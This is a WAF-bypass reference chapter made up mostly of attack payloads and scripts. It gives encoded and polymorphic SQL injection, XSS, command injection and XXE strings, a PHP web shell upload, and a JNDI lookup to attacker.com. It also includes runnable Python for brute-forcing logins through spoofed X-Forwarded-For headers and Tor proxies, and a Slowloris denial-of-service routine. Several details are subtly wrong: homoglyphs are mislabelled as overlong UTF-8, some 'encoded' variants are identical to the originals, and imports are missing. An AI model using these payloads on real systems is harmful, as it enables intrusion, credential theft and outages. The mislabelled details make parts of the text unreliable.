# WAF Bypass Techniques: Deep Technical Analysis

## 1. WAF Architecture and Fundamentals

### 1.1 How WAFs Process Traffic

Web Application Firewalls inspect HTTP traffic against rule sets to identify and block malicious requests. Understanding their processing model is essential for bypassing them:

```
Client Request Flow:
━━━━━━━━━━━━━━━━━━━

1. Client sends HTTP request
2. WAF receives request (before application server)
3. WAF normalizes/parses request:
   a. URL decoding (%XX)
   b. HTML entity decoding (&#XX;)
   c. Unicode normalization
   d. Path normalization (/../, /./)
   e. Whitespace normalization
   f. Content-Type detection and body parsing
4. WAF matches normalized request against rules
5. If match → block (403) or pass through
6. Application server receives request
7. Application server may perform DIFFERENT normalization
8. Gap between WAF normalization and app server normalization = bypass opportunity
```

### 1.2 Major WAF Engines and Their Quirks

| WAF | Engine | Notable Characteristics |
|-----|--------|------------------------|
| ModSecurity (CRS) | Open source, regex-based | Most transparent; ruleset is public; transactional rule model |
| AWS WAF | Managed, rule-based | Lacks body inspection by default; JSON parsing quirks; rate-based rules |
| Cloudflare WAF | Managed, ML + regex | Strong normalization; custom rules; bot management |
| Akamai Kona Site Defender | Managed, dual-layer | HTTP/2 deep inspection; aggressive normalization |
| Azure Front Door WAF | Managed, rule-based | Bot rules; custom rules with geographic matching |
| Imperva WAF | Appliance/cloud, behavioral | Correlation across requests; learning mode |
| F5 BIG-IP ASM | Appliance, policy-based | Parameter-level policies; signature + anomaly detection |
| Sucuri WAF | Cloud, signature-based | WordPress-focused; limited advanced bypass handling |

### 1.3 ModSecurity CRS Analysis

ModSecurity with the OWASP Core Rule Set (CRS) is the baseline for WAF analysis. Understanding CRS rules reveals where bypasses exist:

```apache
# ModSecurity CRS Rule Examples

# SQL injection detection (CRS rule 942100)
SecRule REQUEST_URI|REQUEST_BODY|REQUEST_HEADERS:Referer "@rx (?i:(?:\bunion\b\s\bselect\b))" \
    "id:942100,phase:2,deny,status:403,msg:'SQL Injection Attack Detected'"

# XSS detection (CRS rule 941100)
SecRule REQUEST_URI|REQUEST_BODY|REQUEST_HEADERS "@rx (?i:<script[\s/>])" \
    "id:941100,phase:2,deny,status:403,msg:'XSS Attack Detected'"

# Command injection detection (CRS rule 932100)
SecRule REQUEST_URI|REQUEST_BODY "@rx (?i:(?:;|\||&|&&|\$\(|\n|\r)\s*(?:cat|ls|id|whoami|uname|wget|curl))" \
    "id:932100,phase:2,deny,status:403,msg:'Command Injection Attack Detected'"
```

CRS v4 introduced significant changes:
- **Paranoia levels**: Rule sets organized into PL1 (baseline) through PL4 (extreme). Higher levels catch more attacks but generate more false positives.
- **Rule chaining**: Multiple conditions must match in sequence. A bypass only needs to fail one condition in the chain.
- **Transformation functions**: Rules apply transformations before matching (`t:lowercase`, `t:urlDecode`, `t:htmlEntityDecode`, `t:normalizePath`, `t:removeNulls`). Each transformation is a potential bypass point.

---

## 2. Encoding-Based Bypasses

### 2.1 Double URL Encoding

WAFs typically decode URL-encoded data once. If the application decodes it again, double-encoded payloads bypass the WAF:

```
Original payload: <script>alert(1)</script>
Single encoded:  %3Cscript%3Ealert(1)%3C/script%3E
Double encoded:  %253Cscript%253Ealert(1)%253C/script%253E

WAF sees:        %3Cscript%3Ealert(1)%3C/script%3E
                    (after first decode: literal string, not HTML tags)
App sees:         <script>alert(1)</script>
                    (after second decode: active HTML tags)

SQL injection:
Original:   ' OR 1=1--
Single:     %27%20OR%201%3D1--
Double:     %2527%2520OR%25201%253D1--
```

```python
# Double URL encoding generator
import urllib.parse

def double_encode(payload):
    """Generate double URL-encoded payload."""
    single = urllib.parse.quote(payload)
    double = urllib.parse.quote(single)
    return double

payloads = [
    "<script>alert(1)</script>",
    "' OR 1=1--",
    "cat /etc/passwd",
    "${jndi:ldap://attacker.com/a}",
]

for payload in payloads:
    print(f"Original:  {payload}")
    print(f"Single:    {urllib.parse.quote(payload)}")
    print(f"Double:    {double_encode(payload)}")
    print()
```

### 2.2 Unicode Normalization Bypasses

Unicode has multiple ways to represent the same character. WAFs and application servers may normalize differently:

```
# Overlong UTF-8 encoding (NIST SP 800-53)
<script> → <scrıpt> (dotless i: U+0131)
<script> → <scrιpt> (iota: U+03B9)

# Unicode equivalence bypasses
# NFC vs NFD normalization
# é (U+00E9) can be represented as:
#   NFC: U+00E9 (precomposed)
#   NFD: U+0065 U+0301 (e + combining acute accent)

# WAF sees NFD, application normalizes to NFC:
<script> → <\u0073cript>  (s as Unicode escape)
SELECT   → \u0053ELECT    (S as Unicode escape)
UNION    → \u0055NION      (U as Unicode escape)

# Homoglyph bypasses (visually similar characters)
<script> → <ѕcript> (Cyrillic s: U+0455)
<script> → <scrіpt> (Cyrillic і: U+0456)
SELECT   → ЅELECT     (Cyrillic Ѕ: U+0405)
```

```http
# Unicode in HTTP headers
# Some WAFs normalize headers differently than application servers:
GET /api/search?q=%C0%AE%C0%AE/etc/passwd HTTP/1.1
# %C0%AE = overlong encoding of '.' (dot)
# After WAF normalization: /api/search?q=../etc/passwd (blocked)
# But if WAF doesn't normalize overlong UTF-8: passes through
# Application server normalizes: ../etc/passwd → path traversal

# Unicode normalization in SQL injection
GET /api/search?q=1+%EF%BC%87+OR+1%3D1 HTTP/1.1
# %EF%BC%87 = fullwidth apostrophe (U+FF07)
# WAF sees: 1 ＇ OR 1=1 (not matching SQL injection pattern)
# Application normalizes to: 1' OR 1=1 (SQL injection active)
```

### 2.3 HTML Entity Encoding

```
# HTML entity encoding bypasses XSS filters
<script>alert(1)</script>

# Decimal entities
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

# Named entities (limited)
&lt;script&gt;alert(1)&lt;/script&gt;  (rendered in HTML context only)

# Mixed encoding (some chars encoded, some not)
<&#115;cript>alert(1)</&#115;cript>
<scr&#105;pt>alert(1)</scr&#105;pt>

# HTML entity without semicolon (some parsers accept this)
&#60script&#62alert(1)&#60/script&#62

# Hex entities
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;

# Invalid but accepted entities (parser differences)
<scr<script>ipt>alert(1)</scr</script>ipt>
# WAF removes <script>...</script>, leaving: <script>alert(1)</script>
```

---

## 3. HTTP Parameter Pollution

### 3.1 Parameter Duplication

Different web servers handle duplicate HTTP parameters differently, creating WAF bypass opportunities:

```http
# HPP: Sending the same parameter multiple times

# PHP/Apache: LAST value wins
?user=alice&user=admin → $_GET['user'] = 'admin'

# ASP.NET: FIRST value wins (comma-separated)
?user=alice&user=admin → Request['user'] = 'alice,admin'

# Tomcat: FIRST value wins
?user=alice&user=admin → request.getParameter('user') = 'alice'

# Node.js (Express): FIRST value wins (array access gets all)
?user=alice&user=admin → req.query.user = 'alice' (or ['alice', 'admin'] with express.array)

# HPP bypass for WAF:
# WAF sees: id=1 (first parameter, benign)
# Application sees: id=1 OR 1=1 (second parameter, malicious)

GET /api/users?id=1&id=1+OR+1=1 HTTP/1.1
# WAF (checks first parameter): id=1 → passes
# Backend (uses last parameter): id=1 OR 1=1 → SQL injection!
```

### 3.2 Parameter Name Manipulation

```http
# Bypass 1: Case variation in parameter names
?UserID=1        → WAF checks 'UserID'
?userid=1+OR+1=1 → WAF checks 'userid' (different parameter!)
# Backend normalizes: 'UserID' and 'userid' map to same parameter

# Bypass 2: Trailing whitespace or null byte in parameter name
?user%20=1+OR+1=1  → WAF may not recognize 'user ' as 'user'
?user%00=1+OR+1=1  → Null byte truncation in parameter name

# Bypass 3: Array notation
?user[]=admin    → PHP interprets as array: $_GET['user'] = ['admin']
?user[]=admin&user[]=1+OR+1=1  → $_GET['user'] = ['admin', '1 OR 1=1']

# Bypass 4: Nested parameters (Express.js qs library)
?user[name]=alice       → {user: {name: 'alice'}}
?user[role]=admin       → {user: {role: 'admin'}}  (mass assignment!)
?user[__proto__][isAdmin]=true  → prototype pollution

# Bypass 5: Content-Type confusion
POST /api/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=secret

# WAF parses as form data, but:
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": "' OR '1'='1"}

# If WAF doesn't parse JSON body, SQL injection in JSON is invisible to WAF
```

---

## 4. Content-Type Confusion

### 4.1 JSON/XML Body Bypass

WAFs may only inspect `application/x-www-form-urlencoded` bodies, missing payloads in JSON or XML:

```http
# WAF-inspected: form data (most WAFs parse this)
POST /api/search HTTP/1.1
Content-Type: application/x-www-form-urlencoded

query=test&filter=category

# WAF-uninspected: JSON body (many WAFs don't parse deep JSON)
POST /api/search HTTP/1.1
Content-Type: application/json

{"query": "test", "filter": "category'; DROP TABLE products;--"}

# WAF-uninspected: XML body (requires XML parser)
POST /api/search HTTP/1.1
Content-Type: application/xml

<search>
  <query>test</query>
  <filter>category' OR '1'='1'</filter>
</search>

# WAF-uninspected: multipart form data
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="query"

test' OR '1'='1
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

file content
------WebKitFormBoundary--
```

### 4.2 Chunked Transfer Encoding

```http
# Normal request: WAF sees complete body
POST /api/search HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

query=test'+OR+1=1--&category=all

# Chunked request: WAF may not reassemble chunks before inspection
POST /api/search HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

9
query=te
7
st'+OR+
8
1=1--&cat
5
egory
0

# The WAF sees: chunked data, not the complete body
# The application server reassembles: query=test'+OR+1=1--&category=all
# If the WAF doesn't buffer and reassemble chunks, the injection passes unnoticed
```

---

## 5. HTTP/2 Smuggling

### 5.1 HTTP/2-Specific Bypass Techniques

```python
# HTTP/2 binary framing enables bypasses not possible in HTTP/1.1

# Technique 1: HTTP/2 header capitalization
# HTTP/2 headers are lowercase by specification, but some servers
# process headers case-sensitively after H2→H1 downgrade
# WAF expects lowercase headers, backend expects traditional case

# Technique 2: HPACK dynamic table manipulation
# HPACK compresses headers using a dynamic table
# Malicious headers can be encoded in a way that the WAF can't decompress
# but the backend can

# Technique 3: HTTP/2 CONTINUATION frames
# HTTP/2 headers can span multiple CONTINUATION frames
# Some WAFs only inspect the first HEADERS frame
# Malicious content placed in subsequent CONTINUATION frames

# Technique 4: HTTP/2 Rapid Reset (CVE-2023-44487)
# Not a content bypass, but a DoS technique:
# Client sends HEADERS + RST_STREAM immediately, rapidly cycling streams
# Server allocates resources for each stream but they're immediately cancelled
# Effective request rate: hundreds of millions per second
```

### 5.2 H2C (HTTP/2 Cleartext) Smuggling

```http
# HTTP/2 cleartext upgrade smuggling
# If a proxy supports HTTP/1.1 but can upgrade to HTTP/2 cleartext (h2c):

# Client sends HTTP/1.1 request with Upgrade header:
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
Connection: Upgrade, HTTP2-Settings
HTTP2-Settings: AAMAA...

# Proxy forwards to backend, backend responds with 101 Switching Protocols
# Backend and client now communicate in HTTP/2 (binary frames)
# Proxy can't inspect HTTP/2 frames → WAF bypass

# h2c smuggling for WAF bypass:
GET /safe-page HTTP/1.1
Host: target.com
Upgrade: h2c
Connection: Upgrade

# After upgrade, send HTTP/2 request:
# :method GET
# :path /admin/secret
# :authority target.com
# → Proxy sees h2c upgrade, can't inspect subsequent HTTP/2 frames
# → Backend receives HTTP/2 request to /admin/secret
```

---

## 6. JSON and XML Nested Injection

### 6.1 JSON-Specific Bypasses

```http
# JSON body with WAF-evading SQL injection
POST /api/users/search HTTP/1.1
Content-Type: application/json

{
  "query": "test",
  "filter": {
    "$where": "this.username == 'admin' || this.password.match(/.*/)"
  }
}

# MongoDB operator injection inside JSON
{
  "username": {"$ne": "admin"},
  "password": {"$ne": ""}
}

# JSON Unicode escaping
{"query": "\u0027 OR 1=1--"}
# \u0027 = single quote, invisible to WAF pattern matching

# JSON line comments (invalid JSON but some parsers accept)
{"query": "test' /*comment*/ OR 1=1--"}
# WAF may strip comments, seeing: test' OR 1=1--
# But some parsers: test' /*comment*/ OR 1=1-- (with comment intact)

# JSON key collision (last value wins in most parsers)
{"query": "test", "query": "' OR 1=1--"}
# WAF sees first "query": "test" (benign)
# Application sees last "query": "' OR 1=1--" (malicious)
```

### 6.2 XML Nesting and CDATA Bypasses

```http
# XXE via XML body (WAF may not inspect XML)
POST /api/process HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<query>
  <text>&xxe;</text>
</query>

# CDATA wrapping to hide SQL injection from WAF
POST /api/search HTTP/1.1
Content-Type: application/xml

<query>
  <text><![CDATA[' OR 1=1--]]></text>
</query>
<!-- WAF sees: CDATA section, doesn't inspect contents -->
<!-- Application parses CDATA: ' OR 1=1-- -->

# XML comment injection
<query>
  <text>test' <!---->OR 1=1--</text>
</query>
<!-- WAF strips comments: test' OR 1=1-- → blocked? -->
<!-- But if WAF strips comments differently:
     test' OR 1=1-- (blocked)
     test' OR 1=1-- (if WAF doesn't strip XML comments)
-->

# SOAP injection
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:api="http://api.target.com">
  <soapenv:Header/>
  <soapenv:Body>
    <api:Search>
      <api:query>test' UNION SELECT username,password FROM users--</api:query>
    </api:Search>
  </soapenv:Body>
</soapenv:Envelope>
```

---

## 7. Polymorphic Payloads

### 7.1 SQL Injection Polymorphism

```sql
-- Basic SQL injection (blocked by all WAFs)
' OR 1=1--

-- Polymorphic variants (each evades different pattern sets):

-- Case variation (WAFs often use case-insensitive matching, but some don't)
'oR 1=1--
'Or 1=1--

-- Comment insertion (break pattern matching without changing SQL semantics)
'/**/OR/**/1=1--
'OR 1/**/=/**/1--
'OR/*comment*/1=1--

-- Alternative boolean expressions
'OR 1=1--
'OR 2>1--
'OR 'a'='a'--
'OR 'a' LIKE 'a'--
'OR 1<>0--
'OR 1 IN (1)--
'OR 1 BETWEEN 1 AND 2--
'OR 1 IS NOT NULL--
'OR 1--  (implicit true in MySQL)

-- Alternative string concatenation (bypasses quote-based detection)
'OR 'ad'||'min'='admin'--   -- Oracle, PostgreSQL
'OR 'ad'+'min'='admin'--    -- MSSQL
'OR CONCAT('ad','min')='admin'--  -- MySQL

-- Hex encoding
'OR 0x41=0x41--           -- 'A'='A' in hex
'OR 0x61646D696E=0x61646D696E--  -- 'admin'='admin' in hex

-- Alternative OR syntax
'OR 1=1--     → ' HAVING 1=1--
'OR 1=1--     → ' GROUP BY 1 HAVING 1=1--
'OR 1=1--     → ' AND 1=1 UNION SELECT 1,2,3--

-- MySQL-specific
'OR 1=1--     → 'OR 1 REGEXP 1--     -- Using REGEXP
'OR 1=1--     → 'OR 1 RLIKE 1--      -- Using RLIKE
'OR 1=1--     → 'OR 1=1 LIMIT 1--    -- Using LIMIT

-- Time-based alternatives
' AND SLEEP(5)--           → ' AND BENCHMARK(5000000, SHA1('a'))--  -- MySQL
' AND SLEEP(5)--           → ' AND WAITFOR DELAY '0:0:5'--         -- MSSQL
' AND SLEEP(5)--           → ' AND pg_sleep(5)--                    -- PostgreSQL
```

### 7.2 XSS Polymorphism

```html
<!-- Basic XSS (blocked by all WAFs) -->
<script>alert(1)</script>

-- Polymorphic variants:

-- Event handlers
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video onerror=alert(1)><source src=x>
<audio onerror=alert(1)><source src=x>
<details ontoggle=alert(1) open>test</details>

-- JavaScript URI
<a href="javascript:alert(1)">click</a>
<a href="javascript:alert(1)">click</a>  <!-- Encoded -->

-- SVG with script
<svg><script>alert(1)</script></svg>

-- SVG with animate
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

-- CSS injection (if style-src allows unsafe-inline)
<div style="background:url('javascript:alert(1)')">

-- HTML entities
<img src=x onerror="&#97;lert(1)">
<img src=x onerror="alert(1)">
<img src=x onerror="&#x61;lert(1)">

-- Null byte insertion
<scr\x00ipt>alert(1)</script>
<img src=x onerror=\x00alert(1)>

-- newline/tab insertion
<img src=x onerror="alert(1)">
<img src=x onerror="alert(1)">
<img src=x onerror="alert(1)">

-- Encoding in event handlers
<img src=x onerror="&#x61;lert(1)">

-- Template literal encoding
<img src=x onerror="alert`1`">

-- Self-executing functions
<img src=x onerror="(alert)(1)">
<img src=x onerror="alert(1)//">
<img src=x onerror="alert(1)">

-- DOM clobbering variants
<form id=alert><img src=x onerror=alert(1)>
<img src=x onerror=eval(window.alert)(1)>

-- Mutation XSS (bypass DOMPurify)
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->
```

### 7.3 Command Injection Polymorphism

```bash
# Basic command injection (blocked by all WAFs)
; id

# Polymorphic variants:

# Alternative separators
| id       # Pipe
|| id      # OR
&& id      # AND
& id       # Background
%0a id     # Newline
%0d id     # Carriage return

# Alternative commands
id         → /usr/bin/id
id         → /bin/id
id         → /???/?id        # Glob
id         → /bin/c?t /etc/passwd  # Glob
cat        → /bin/cat
cat        → head            # Alternative command
cat        → less
cat        → more
cat        → tail
cat        → sort
cat        → dd if=/etc/passwd  # Alternative read

# Obfuscation techniques
;/usr/bin/id                           # Absolute path
;cat /etc/passwd|base64                # Encode output
;c'a't /etc/passwd                     # String splitting (bash)
;c\at /etc/passwd                      # Backslash escaping
;cat</etc/passwd                       # Input redirection
;cat${IFS}/etc/passwd                  # IFS variable
;{cat,/etc/passwd}                     # Brace expansion
;$(printf '\x63\x61\x74') /etc/passwd  # printf hex
;$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)  # Base64 decode

# Character-by-character execution
;printf '\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144' | sh
# Octal: cat /etc/passwd

# Variable substitution
;a=cat;b=/etc/passwd;$a $b
;a=c;b=at;$a$b /etc/passwd

# Reverse string
;echo 'dwssap/cte/ tac' | rev | sh

# Environment variable
;${PATH:0:1}etc${PATH:0:1}passwd   # Uses / from PATH
;$HOME                               # Uses home directory

# Injecting via environment variables
;env_cmd=$(cat /etc/passwd); $env_cmd
```

---

## 8. Regex Bypass Techniques

### 8.1 Understanding WAF Regular Expressions

WAFs use regex patterns to match attack signatures. Bypassing regex requires understanding the pattern logic:

```regex
# Common WAF regex patterns and bypasses

# Pattern: (?i:<script[^>]*>[\s\S]*?<\/script>)
# Matches: <script>alert(1)</script>
# Bypass: <script/src=data:text/html,<script>alert(1)</script>>  (no > after <script)
# Bypass: <script>alert(1)</script<!--  (HTML comment terminator confuse)
# Bypass: <svg onload=alert(1)>  (completely different vector)

# Pattern: (?i:\bunion\b.*?\bselect\b)
# Matches: UNION SELECT
# Bypass: UNION/**/SELECT  (comment between keywords)
# Bypass: UNION ALL SELECT  (ALL between keywords)
# Bypass: UNION%0aSELECT  (newline between keywords)

# Pattern: (?i:\bor\b\s+\d+\s*=\s*\d+)
# Matches: OR 1=1
# Bypass: OR 1 LIKE 1  (LIKE instead of =)
# Bypass: OR 1 BETWEEN 1 AND 2  (BETWEEN instead of =)
# Bypass: OR #comment 1=1  (comment in middle)

# Pattern: (?i:\bexec\b.*?\()
# Matches: EXEC(...)
# Bypass: EXEC/**/(...)  (comment between EXEC and parenthesis)
# Bypass: EXECUTE(...  (EXECUTE instead of EXEC)
# Bypass: EXEC/*comment*/UTE(...)  (comment in middle)
```

### 8.2 Advanced Regex Bypass Methods

```
# Method 1: Regex engine timeout (ReDoS against WAF)
# Some WAFs have regex timeouts. Craft input that causes catastrophic backtracking:
# Pattern: (a+)+$
# Input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
# The regex engine will try exponentially many combinations before timing out
# When timeout occurs, WAF may pass the request through (fail open)

# Method 2: Regex line limit bypass
# WAFs may only check the first N bytes of a request
# Place benign content first, malicious content after the check boundary
# Content-Length: 10000
# [8192 bytes of padding data]
# ' OR 1=1--

# Method 3: Regex whitespace confusion
# Some regex patterns assume single whitespace between tokens
# WAF pattern: \bOR\b\s+\d+\s*=\s*\d+
# This assumes a simple "OR 1=1" pattern
# Bypass with unusual whitespace:
' OR\t1=1       # Tab character
' OR1=1          # No space (some SQL parsers accept this with numbers)
' OR\n1=1        # Newline
' OR\r\n1=1      # CRLF

# Method 4: Regex range bypass
# WAF pattern: \b(union\s+select)\b
# This pattern uses \b word boundary
# Bypass: UNION/*comment*/SELECT (no word boundary)
# Bypass: 'UNION/*AAAA*/SELECT' (comment breaks pattern)
```

---

## 9. Request Body Parsing Differences

### 9.1 Content-Type Confusion

```http
# Backend parses JSON, WAF parses form data (or vice versa)
# Send SQL injection in JSON body to a form-data endpoint:

POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": "' OR '1'='1"}

# WAF inspects:
# - Content-Type: application/json
# - WAF may not parse JSON body for SQL patterns
# - WAF passes the request

# Application parses:
# - JSON body with SQL injection in password field
# - SQL injection executes

# Reverse: WAF parses JSON, backend parses form data
POST /api/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

username=admin&password=%27+OR+%271%27%3D%271

# If WAF only inspects JSON bodies, this form-encoded injection is invisible
```

### 9.2 Boundary Manipulation in Multipart Data

```http
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="query"

' OR 1=1--
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-httpd-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--

# Bypass: Modify boundary to include malicious prefix/suffix
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary%0d%0a%0d%0a

# Bypass: Use different boundary formats
Content-Type: multipart/form-data; boundary="--boundary"
# vs
Content-Type: multipart/form-data; boundary="--boundary\r\n"

# Bypass: Boundary with special characters
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary<script>alert(1)</script>
# WAF may fail to parse the boundary, skipping body inspection
```

---

## 10. Cloud WAF Specific Bypasses

### 10.1 AWS WAF

```python
# AWS WAF characteristics:
# - Default rules only inspect first 8KB of body
# - JSON parsing only inspects first-level keys by default
# - Rate limiting is per /16 IP range
# - Custom rules can have up to 5 conditions per rule
# - No regex backreference support in custom rules

# Bypass 1: Oversized body (SQL injection after 8KB)
padding = "A" * 8192  # 8KB padding
payload = f"{padding}' OR 1=1--"
# If WAF only inspects first 8KB, the SQL injection after padding is not checked

# Bypass 2: JSON depth (nested keys beyond inspection depth)
{
  "level1": {
    "level2": {
      "level3": {
        "level4": {
          "level5": "' OR 1=1--"
        }
      }
    }
  }
}
# AWS WAF JSON inspection depth is configurable but default is shallow

# Bypass 3: Content-Type mismatch
# AWS WAF inspects based on Content-Type header:
# - application/x-www-form-urlencoded → form data inspection
# - application/json → JSON inspection
# - multipart/form-data → multipart inspection
# If Content-Type doesn't match actual body format, WAF inspection fails

# Bypass 4: IP-based rate limit evasion
# AWS WAF rate limiting is per /16 CIDR block
# Distributed requests across multiple IP ranges bypass rate limiting
for i in range(256):
    # Use different IP range for each batch
    proxies = [f"http://10.{i}.0.1:8080"]

# Bypass 5: AWS WAF regex pattern limitations
# Patterns that AWS WAF regex engine doesn't support:
# - Backreferences (\1, \2, etc.)
# - Lookahead/lookbehind assertions
# - Named capture groups
# - Some character classes shorthand
# Payload: O`R 1=1--  (backtick confuses regex engine)
# Payload: ' OR 1 BETWEEN 1 AND 2--  (BETWEEN not in SQLi patterns)
```

### 10.2 Cloudflare WAF

```
# Cloudflare WAF characteristics:
# - ML-based anomaly detection + rule-based matching
# - Strong URL normalization (breaks many encoding bypasses)
# - HTTP/2 and HTTP/3 support
# - Body inspection limited to first 128KB
# - Managed rules: OWASP, Cloudflare Specials, Exposed Credentials

# Bypass 1: Content-Type with charset manipulation
Content-Type: application/json; charset=utf-7
# Cloudflare may not parse UTF-7 correctly
# UTF-7 encoded: +ADw-script+AD4-alert(1)+ADw-/script+AD4-
# Decodes to: <script>alert(1)</script>

# Bypass 2: Nested URL encoding
%25%33%43 → %3C → < (after two decodes)
# Cloudflare decodes once, application decodes twice

# Bypass 3: Large request body
# Cloudflare inspects up to 128KB
# Place malicious payload after 128KB threshold
padding = "A" * 131072  # 128KB padding
payload = f"{padding}' OR 1=1--"

# Bypass 4: Chunked transfer with small chunks
# Send SQL injection split across multiple small chunks
# Some WAF configurations don't reassemble chunks before inspection

# Bypass 5: WebSocket upgrade
# Cloudflare may not inspect WebSocket frames after upgrade
# Establish WebSocket connection, then send malicious data
GET /ws HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

# After upgrade, send malicious payload via WebSocket frames
```

### 10.3 Azure Front Door WAF

```
# Azure Front Door WAF characteristics:
# - Managed rule sets: Microsoft_DefaultRuleSet, Microsoft_BotManagerRuleSet
# - Custom rules with IP, geography, and HTTP match conditions
# - Body inspection limit: 128KB
# - Supports HTTP/2 and HTTP/3

# Bypass 1: Azure-specific URL normalization
# Azure Front Door normalizes URLs differently from some backends
# Test: /api/..;/admin (semicolon path confusion)
# Azure Front Door: sends to /api/admin
# IIS backend: may interpret semicolon as path terminator

# Bypass 2: Azure WAF rule exclusion
# Rules can be excluded for specific conditions
# If an exclusion exists for a specific path or header, bypass it
# Test: Send SQL injection in an excluded header
X-Forwarded-Host: ' OR 1=1--
# If X-Forwarded-Host is excluded from SQL injection checks

# Bypass 3: Rate limiting per rule, not per IP
# Azure rate limiting can be per-rule, not global
# Distribute attacks across different rules to avoid individual rate limits
```

---

## 11. Rate Limiting Bypass

### 11.1 Rate Limit Evasion Techniques

```python
# Technique 1: X-Forwarded-For rotation
import requests

for i in range(10000):
    headers = {'X-Forwarded-For': f'10.{i // 256}.{i % 256}.1'}
    resp = requests.post('https://target.com/api/login',
                        json={'username': 'admin', 'password': f'pass{i}'},
                        headers=headers)
    if resp.status_code == 200:
        print(f'[+] Password found: pass{i}')
        break

# Technique 2: Distributed source IPs
# Use residential proxy networks, cloud VMs, or botnets
# Tor network (with rate limiting on Tor exits):
import requests
from itertools import cycle

proxies = cycle(['socks5://tor:9050', 'socks5://tor:9051'])
for attempt in range(10000):
    resp = requests.post('https://target.com/api/login',
                        json={'username': 'admin', 'password': f'pass{attempt}'},
                        proxies={'http': next(proxies)})

# Technique 3: API key rotation
# If rate limiting is per API key, create multiple accounts:
api_keys = [register_account() for _ in range(100)]
for attempt, key in enumerate(cycle(api_keys)):
    headers = {'X-API-Key': key}
    resp = requests.post('https://target.com/api/login',
                        json={'username': 'admin', 'password': f'pass{attempt}'},
                        headers=headers)

# Technique 4: HTTP/2 multiplexing
# Send multiple requests over a single HTTP/2 connection
# Some rate limiters count connections, not streams
import httpx

async def brute_force(passwords):
    async with httpx.AsyncClient(http2=True) as client:
        tasks = [client.post('https://target.com/api/login',
                            json={'username': 'admin', 'password': pw})
                for pw in passwords]
        responses = await asyncio.gather(*tasks)
        for resp, pw in zip(responses, passwords):
            if resp.status_code == 200:
                print(f'[+] Password found: {pw}')

# Technique 5: Slowloris (connection exhaustion)
import socket

def slowloris(target, port, num_connections=500):
    sockets = []
    for i in range(num_connections):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
        sockets.append(s)
    
    # Keep connections alive with partial headers
    while True:
        for s in sockets:
            s.send(b"X-a: b\r\n")  # Send header to keep connection alive
        time.sleep(15)
```

---

## Cross-Reference Guide

| Topic | Cross-Reference |
|-------|-----------------|
| Encoding techniques | This chapter (Section 2) |
| HPP and parameter pollution | This chapter (Section 3) |
| Content-type confusion | This chapter (Section 4) |
| HTTP/2 smuggling | This chapter (Section 5) |
| JSON/XML nesting | This chapter (Section 6) |
| Polymorphic payloads | This chapter (Section 7) |
| Regex bypass | This chapter (Section 8) |
| Request parsing differences | This chapter (Section 9) |
| Cloud WAF specifics | This chapter (Section 10) |
| Rate limiting bypass | This chapter (Section 11) |
| SQL injection payloads | `02a_injection_attacks.md` |
| XSS payloads | `04a_client_side_security.md` |
| Command injection | `02a_injection_attacks.md` |
| HTTP request smuggling | `04b_deserialization_race_conditions.md` |
| Testing methodology | `06a_web_security_testing.md` |

---

*WAF bypass is an adversarial cat-and-mouse game. WAFs are necessary but insufficient — they cannot understand application context, and parser differentials between WAF and application create exploitable gaps. The most effective bypasses exploit these differentials rather than trying to outsmart pattern matching. Defense requires defense-in-depth: WAF as a first line, but backed by parameterized queries, CSP, input validation, and secure coding practices.*

---

## References

1. OWASP Foundation. "Web Application Firewall (WAF)." https://owasp.org/www-community/Web_Application_Firewall
2. OWASP Foundation. "WAF Evaluation Criteria." https://owasp.org/www-project-web-security-testing-guide/
3. Trustwave. "ModSecurity: Open Source Web Application Firewall." https://www.modsecurity.org/
4. OWASP Foundation. "ModSecurity Core Rule Set (CRS)." https://owasp.org/www-project-modsecurity-core-rule-set/
5. Kettle, J. "HTTP Desync Attacks: Request Smuggling Reborn." PortSwigger Research, 2019. https://portswigger.net/research/http-desync-attacks
6. PortSwigger Ltd. "Web Security Academy — WAF Bypass." https://portswigger.net/web-security
7. Lin, Z. "HTTP Parameter Pollution." https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution
8. RFC 9112. "HTTP/1.1 Message Syntax and Routing." IETF, 2022.
9. RFC 7541. "HPACK: Header Compression for HTTP/2." IETF, 2015.
10. Cloudflare Documentation. "WAF Managed Rules." https://developers.cloudflare.com/waf/
11. AWS Documentation. "AWS WAF." https://docs.aws.amazon.com/waf/